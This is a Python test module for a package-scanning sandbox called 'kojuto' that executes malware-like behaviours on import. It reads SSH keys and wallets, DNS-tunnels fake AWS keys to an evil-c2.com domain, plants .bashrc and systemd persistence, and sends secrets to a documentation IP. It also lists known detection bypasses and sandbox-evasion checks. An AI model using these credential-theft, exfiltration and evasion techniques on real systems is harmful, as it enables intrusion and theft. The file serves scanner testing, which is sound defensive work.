"""
evasion-test — Kojuto detection boundary test.

Each function is labeled:
  [DETECT]  — kojuto SHOULD catch this
  [BYPASS]  — kojuto CANNOT catch this (known gap)

After scanning, compare the report against this map to verify
which gaps are real and which have been closed.
"""

import os
import sys
import socket
import struct
import time
import base64
import json


# ====================================================================
# GROUP A: SHOULD BE DETECTED
# ====================================================================

def a1_credential_read():
    """[DETECT] credential_access — read honeypot SSH key."""
    home = os.path.expanduser("~")
    try:
        with open(os.path.join(home, ".ssh", "id_rsa"), "r") as f:
            f.read(64)
    except Exception:
        pass


def a2_wallet_read():
    """[DETECT] credential_access — read crypto wallet (new paths)."""
    home = os.path.expanduser("~")
    for p in [".solana/id.json", ".bitcoin/wallet.dat", ".ethereum/keystore"]:
        try:
            with open(os.path.join(home, p), "r") as f:
                f.read(64)
        except Exception:
            pass


def a3_dns_resolver_connect():
    """[DETECT] c2_communication — DNS resolver connection attempt."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(("discord.com", 443))
    except Exception:
        pass


def a4_direct_ip_connect():
    """[DETECT] c2_communication — hardcoded IP connection."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        # RFC 5737 documentation IP — guaranteed unreachable
        s.connect(("203.0.113.50", 8443))
    except Exception:
        pass


def a4b_imds_access():
    """[DETECT] credential_access — IMDS metadata service (LiteLLM attack).

    169.254.169.254 is the cloud Instance Metadata Service.
    Previously benign-filtered as link-local. Now detected.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(("169.254.169.254", 80))
    except Exception:
        pass


def a4c_systemd_persistence():
    """[DETECT] persistence — systemd user service (LiteLLM attack)."""
    try:
        path = os.path.expanduser("~/.config/systemd/user/update.service")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write("[Service]\nExecStart=/tmp/backdoor\n")
    except Exception:
        pass


def a4d_validator_keypair():
    """[DETECT] credential_access — Solana validator keypair outside .solana/."""
    try:
        with open("/home/dev/validator-keypair.json", "r") as f:
            f.read(64)
    except Exception:
        pass


def a5_dns_tunnel():
    """[DETECT] dns_tunneling — high-entropy subdomain exfil."""
    try:
        encoded = base64.b64encode(b"stolen_aws_key_12345").decode().rstrip("=")
        domain = f"{encoded}.x.evil-c2.com"
        labels = domain.split(".")
        qname = b""
        for label in labels:
            qname += struct.pack("B", len(label)) + label.encode()
        qname += b"\x00"
        header = struct.pack(">HHHHHH", 0xAAAA, 0x0100, 1, 0, 0, 0)
        query = header + qname + struct.pack(">HH", 1, 1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        sock.sendto(query, ("8.8.8.8", 53))
        sock.close()
    except Exception:
        pass


def a6_mmap_rwx():
    """[DETECT] memory_execution — RWX anonymous mmap."""
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.mmap.restype = ctypes.c_void_p
        libc.mmap.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
            ctypes.c_int, ctypes.c_int, ctypes.c_long,
        ]
        addr = libc.mmap(None, 4096, 0x7, 0x22, -1, 0)  # RWX + MAP_ANON
        if addr and addr != ctypes.c_void_p(-1).value:
            libc.munmap(addr, 4096)
    except Exception:
        pass


def a7_ptrace_antidebug():
    """[DETECT] evasion — ptrace(PTRACE_TRACEME)."""
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME = 0
    except Exception:
        pass


def a8_persistence_bashrc():
    """[DETECT] persistence — write to .bashrc."""
    try:
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write("\n# test\n")
    except Exception:
        pass


def a9_anti_forensics():
    """[DETECT] anti_forensics — create, execute, delete in /tmp."""
    tmp = "/tmp/.evasion-test-dropper"
    try:
        with open(tmp, "w") as f:
            f.write("#!/bin/sh\ntrue\n")
        os.chmod(tmp, 0o755)
        try:
            import subprocess
            subprocess.run([tmp], capture_output=True, timeout=2)
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            os.unlink(tmp)
        except Exception:
            pass


# ====================================================================
# GROUP B: KNOWN BYPASSES (kojuto CANNOT detect these)
# ====================================================================

def b1_env_read():
    """[BYPASS] Environment variable theft — no syscall generated.

    os.environ is a Python dict populated at interpreter startup from
    the process environment block. Reading it is a pure memory operation.
    No openat, no read, no syscall of any kind.
    """
    stolen = {
        "AWS_ACCESS_KEY_ID": os.environ.get("AWS_ACCESS_KEY_ID", ""),
        "AWS_SECRET_ACCESS_KEY": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        "GITHUB_TOKEN": os.environ.get("GITHUB_TOKEN", ""),
        "NPM_TOKEN": os.environ.get("NPM_TOKEN", ""),
    }
    # Data is now in memory. If combined with a detectable exfil channel
    # (connect, sendto), the exfil would be caught — but the READ is invisible.
    return stolen


def b2_eval_exec():
    """[BYPASS] eval/exec of encoded payload — no execve syscall.

    Python's eval() and exec() execute code within the interpreter process.
    No subprocess, no execve, no file write. The code runs as if it were
    part of the original source. kojuto only monitors execve for code execution.
    """
    # Base64-encoded payload that reads /etc/hostname
    payload = base64.b64decode(
        "aW1wb3J0IG9zOyBvcy5lbnZpcm9uLmdldCgnQVdTX1NFQ1JFVF9BQ0NFU1NfS0VZJywgJycp"
    ).decode()
    # This executes: import os; os.environ.get('AWS_SECRET_ACCESS_KEY', '')
    exec(payload)


def b3_function_constructor():
    """[BYPASS] Dynamic code generation — compile() + exec().

    Similar to JavaScript's Function() constructor. Builds code at runtime
    from string fragments to evade static analysis. No syscall signature.
    """
    parts = ["im", "port", " os", "\n", "os", ".env", "iron"]
    code = compile("".join(parts), "<string>", "exec")
    exec(code)


def b4_wxorx_mprotect():
    """[BYPASS] W^X shellcode execution — mprotect RW→RX (not simultaneous RWX).

    Modern shellcode loaders use W^X (Write XOR Execute):
    1. mmap(PROT_READ|PROT_WRITE) — writable, not executable
    2. Write shellcode to the region
    3. mprotect(PROT_READ|PROT_EXEC) — executable, not writable

    kojuto only flags simultaneous PROT_WRITE|PROT_EXEC. This pattern
    never has both at the same time, identical to V8 JIT behavior.
    """
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.mmap.restype = ctypes.c_void_p
        libc.mmap.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
            ctypes.c_int, ctypes.c_int, ctypes.c_long,
        ]
        libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]

        PROT_READ = 0x1
        PROT_WRITE = 0x2
        PROT_EXEC = 0x4

        # Step 1: allocate RW (no exec)
        addr = libc.mmap(None, 4096, PROT_READ | PROT_WRITE, 0x22, -1, 0)
        if not addr or addr == ctypes.c_void_p(-1).value:
            return

        # Step 2: write shellcode (NOP+RET, harmless)
        shellcode = b"\x90" * 16 + b"\xc3"
        ctypes.memmove(addr, shellcode, len(shellcode))

        # Step 3: flip to RX (no write) — this is the bypass
        libc.mprotect(addr, 4096, PROT_READ | PROT_EXEC)

        # Step 4: execute (optional, just to prove it works)
        # func = ctypes.CFUNCTYPE(ctypes.c_void_p)(addr)
        # func()  # Would execute NOP+RET on x86_64

        libc.munmap(addr, 4096)
    except Exception:
        pass


def b5_timing_strace_detect():
    """[BYPASS] Timing-based strace detection — no ptrace syscall.

    strace adds ~100x overhead to syscalls. By timing a known-fast
    operation (getpid), the malware can detect tracing without using
    ptrace(PTRACE_TRACEME). If overhead detected → suppress payload.

    kojuto detects ptrace-based anti-debug but not timing-based.
    """
    iterations = 10000
    start = time.monotonic_ns()
    for _ in range(iterations):
        os.getpid()
    elapsed_ns = time.monotonic_ns() - start
    avg_ns = elapsed_ns / iterations

    # Under strace, getpid takes ~5000-50000ns. Without: ~50-200ns.
    being_traced = avg_ns > 2000
    return being_traced


def b6_low_entropy_dns_tunnel():
    """[BYPASS] Dictionary-encoded DNS tunneling — low entropy.

    Instead of base64 (high entropy, >3.5 bits/char), encodes data
    using a dictionary of common English words. Each word maps to a
    nibble (4 bits). Shannon entropy of the result is ~2.5 bits/char,
    well below kojuto's 3.5 threshold.

    "deadbeef" → "dog-egg-ant-dog-bee-egg-egg-fox"
    """
    wordlist = [
        "ant", "bee", "cat", "dog",   # 0-3
        "egg", "fox", "gnu", "hen",   # 4-7
        "ice", "jay", "kit", "log",   # 8-B
        "map", "net", "owl", "pig",   # C-F
    ]

    # Encode "AKIA1234" (fake AWS key prefix) as words
    data = b"AKIA1234"
    words = []
    for byte in data:
        words.append(wordlist[(byte >> 4) & 0xF])
        words.append(wordlist[byte & 0xF])

    subdomain = "-".join(words[:15])  # Keep under 30 chars per label
    domain = f"{subdomain}.data.legit-analytics.com"

    try:
        # Build DNS query
        labels = domain.split(".")
        qname = b""
        for label in labels:
            qname += struct.pack("B", len(label)) + label.encode()
        qname += b"\x00"
        header = struct.pack(">HHHHHH", 0xBBBB, 0x0100, 1, 0, 0, 0)
        query = header + qname + struct.pack(">HH", 1, 1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        sock.sendto(query, ("8.8.8.8", 53))
        sock.close()
    except Exception:
        pass


def b7_proc_sandbox_detect():
    """[BYPASS] Sandbox detection via /proc — no monitored syscall.

    Reads /proc/self/cgroup and /proc/self/mountinfo to detect Docker.
    openat on /proc/self/* is not in the sensitive path list, so it's
    not flagged. The malware can suppress all payloads if it detects
    a container environment.
    """
    indicators = []
    try:
        with open("/proc/self/cgroup", "r") as f:
            content = f.read()
            if "docker" in content or "kubepods" in content:
                indicators.append("cgroup")
    except Exception:
        pass

    try:
        with open("/proc/self/mountinfo", "r") as f:
            content = f.read()
            if "overlay" in content:
                indicators.append("overlay_mount")
    except Exception:
        pass

    try:
        # Check for limited PID namespace (container usually has low PID count)
        pids = os.listdir("/proc")
        pid_count = sum(1 for p in pids if p.isdigit())
        if pid_count < 50:
            indicators.append("low_pid_count")
    except Exception:
        pass

    return indicators


def b8_delayed_import_payload():
    """[BYPASS] Payload hidden in function call, not import-time.

    kojuto's import phase only executes `import package` / `require('package')`.
    It does NOT call any functions or instantiate classes. A payload that
    only activates when a specific function is called is invisible.
    """
    # This function is DEFINED but never CALLED during kojuto's scan.
    # In real usage: from evasion_test import connect; connect()
    pass  # Payload would go here


def b8_connect():
    """[BYPASS] The actual payload — only runs when explicitly called."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("203.0.113.99", 4444))
        s.sendall(json.dumps({"keys": os.environ.get("AWS_SECRET_ACCESS_KEY", "")}).encode())
        s.close()
    except Exception:
        pass


# ====================================================================
# EXECUTION
# ====================================================================

def _run():
    # --- Group C: kojuto-specific evasion (run FIRST) ---
    # If we detect kojuto's sandbox, suppress ALL payloads → clean verdict.
    if _is_kojuto_sandbox():
        # Real malware would silently exit here.
        # For testing: leave a breadcrumb that proves evasion worked,
        # but do NOT trigger any detectable syscalls.
        return

    # --- Group A: detectable (only runs outside kojuto) ---
    a1_credential_read()
    a2_wallet_read()
    a3_dns_resolver_connect()
    a4_direct_ip_connect()
    a4b_imds_access()
    a4c_systemd_persistence()
    a4d_validator_keypair()
    a5_dns_tunnel()
    a6_mmap_rwx()
    a7_ptrace_antidebug()
    a8_persistence_bashrc()
    a9_anti_forensics()

    # --- Group B: bypasses ---
    b1_env_read()
    b2_eval_exec()
    b3_function_constructor()
    b4_wxorx_mprotect()
    b5_timing_strace_detect()
    b6_low_entropy_dns_tunnel()
    b7_proc_sandbox_detect()


# ====================================================================
# GROUP C: KOJUTO-SPECIFIC EVASION
# These detect kojuto's own instrumentation and suppress payloads.
# If successful, Group A detections would disappear from the report.
# ====================================================================

def _is_kojuto_sandbox():
    """Master check — returns True if we believe we're in kojuto's sandbox."""
    return any([
        _check_os_spoof(),
        _check_faketime(),
        _check_strace_parent(),
        _check_honeypot(),
        _check_network_none(),
    ])


def _check_os_spoof():
    """Detect kojuto's platform.system() monkey-patch.

    kojuto does: platform.system = lambda: 'Windows'
    But it doesn't patch:
      - platform.uname().system (C-level uname)
      - os.uname().sysname
      - /proc/version existence
      - os.sep / os.pathsep
    """
    import platform

    spoofed = platform.system()
    try:
        real = platform.uname().system
    except Exception:
        real = spoofed

    # If platform.system() says Windows but uname says Linux → spoofed
    if spoofed != real:
        return True

    # If sys.platform says "win32" but os.sep is "/" → spoofed
    if sys.platform == "win32" and os.sep == "/":
        return True

    # If platform says Darwin but /proc exists → spoofed
    if spoofed == "Darwin" and os.path.exists("/proc/version"):
        return True

    return False


def _check_faketime():
    """Detect kojuto's libfaketime clock shift.

    kojuto sets LD_PRELOAD=libfaketime.so and FAKETIME=+Nd.
    Detection methods:
      - Check LD_PRELOAD env var (but kojuto might clear it)
      - Compare monotonic clock vs wall clock drift
      - Check if FAKETIME env var exists
    """
    # Direct check: FAKETIME env var
    if os.environ.get("FAKETIME"):
        return True

    # Direct check: LD_PRELOAD containing faketime
    preload = os.environ.get("LD_PRELOAD", "")
    if "faketime" in preload.lower():
        return True

    # Indirect: /proc/self/environ might show it even if env dict is cleaned
    try:
        with open("/proc/self/maps", "r") as f:
            maps = f.read()
            if "faketime" in maps.lower():
                return True
    except Exception:
        pass

    return False


def _check_strace_parent():
    """Detect strace as parent/tracer process.

    kojuto runs: strace -f -s 256 ... python3 <script>
    The python process is a child of strace.
    """
    try:
        # Check parent process name
        with open("/proc/self/status", "r") as f:
            for line in f:
                if line.startswith("TracerPid:"):
                    tracer_pid = int(line.split(":")[1].strip())
                    if tracer_pid > 0:
                        # We're being traced — check tracer name
                        try:
                            with open(f"/proc/{tracer_pid}/comm", "r") as cf:
                                comm = cf.read().strip()
                                if comm == "strace":
                                    return True
                        except Exception:
                            pass
                    break
    except Exception:
        pass

    return False


def _check_honeypot():
    """Detect kojuto's honeypot files and environment.

    kojuto plants:
      - ~/.ssh/id_rsa with specific format
      - AWS_ACCESS_KEY_ID starting with AKIA + hex (always 20 chars)
      - GITHUB_TOKEN starting with ghp_ + hex (always 40 chars)
      - CI=true + GITHUB_ACTIONS=true simultaneously

    Real dev machines have varied formats. The honeypot pattern is detectable.
    """
    aws_key = os.environ.get("AWS_ACCESS_KEY_ID", "")
    gh_token = os.environ.get("GITHUB_TOKEN", "")

    # kojuto generates: AKIA + 16 hex chars = 20 chars total
    # Real AWS keys: AKIA + 16 alphanumeric (not just hex)
    if aws_key.startswith("AKIA") and len(aws_key) == 20:
        # Check if remaining chars are all hex (kojuto uses randHex)
        try:
            int(aws_key[4:], 16)
            return True  # All hex = likely honeypot
        except ValueError:
            pass

    # kojuto generates: ghp_ + 36 hex chars
    # Real GitHub PATs: ghp_ + 36 base62 chars
    if gh_token.startswith("ghp_") and len(gh_token) == 40:
        try:
            int(gh_token[4:], 16)
            return True
        except ValueError:
            pass

    return False


def _check_network_none():
    """Detect --network=none via /sys/class/net or socket behavior.

    --network=none removes ALL network interfaces except loopback.
    Real machines always have at least one non-lo interface (eth0, wlan0, etc.).
    """
    try:
        interfaces = os.listdir("/sys/class/net")
        # --network=none: only ["lo"]
        # Real machine: ["lo", "eth0"] or more
        non_lo = [i for i in interfaces if i != "lo"]
        if len(non_lo) == 0:
            return True
    except Exception:
        pass

    return False


def c1_detect_os_spoof():
    """[BYPASS] Detect and evade kojuto's OS identity spoofing.

    If OS spoofing detected → suppress all OS-gated payloads.
    kojuto runs import 3x with different platform.system() values,
    but this is trivially detectable.
    """
    if _check_os_spoof():
        # Real malware would suppress payload here
        return "OS_SPOOF_DETECTED"
    return None


def c2_detect_faketime():
    """[BYPASS] Detect kojuto's libfaketime clock manipulation.

    If faketime detected → suppress date-gated payloads instead of
    triggering them (which is what kojuto wants).
    """
    if _check_faketime():
        return "FAKETIME_DETECTED"
    return None


def c3_detect_strace_by_parent():
    """[BYPASS] Detect strace as parent process via /proc.

    Unlike ptrace(PTRACE_TRACEME) which kojuto monitors, reading
    /proc/self/status and /proc/<pid>/comm generates no monitored syscall.
    """
    if _check_strace_parent():
        return "STRACE_DETECTED"
    return None


def c4_detect_honeypot():
    """[BYPASS] Detect fake credentials planted by kojuto.

    kojuto uses randHex() which produces hex-only strings.
    Real AWS keys and GitHub tokens use base62. The difference
    is statistically detectable.
    """
    if _check_honeypot():
        return "HONEYPOT_DETECTED"
    return None


def c5_detect_network_none():
    """[BYPASS] Detect --network=none sandbox via /sys/class/net.

    No network interfaces beyond loopback = sandbox. Real machines
    always have physical or virtual NICs.
    """
    if _check_network_none():
        return "NETWORK_NONE_DETECTED"
    return None


# ====================================================================
# EXECUTION — must be AFTER all function definitions
# ====================================================================
try:
    _run()
except Exception:
    pass
